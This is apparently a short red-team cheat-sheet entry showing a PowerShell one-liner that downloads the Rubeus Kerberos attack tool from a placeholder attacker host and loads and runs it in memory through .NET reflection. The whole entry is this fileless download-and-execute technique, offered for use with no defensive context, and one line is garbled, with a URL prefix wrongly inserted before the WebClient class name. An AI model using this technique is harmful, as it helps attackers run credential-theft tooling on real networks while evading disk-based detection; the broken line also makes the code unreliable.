# Powershell File Download

## Using Reflection - @Alh4zr3d

```powershell
$d = (New-Object http://System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')

[System.Reflection.Assembly]::Load($d)
[Rubeus.Program]::Main("triage".Split()) # replace "triage" by a command
```
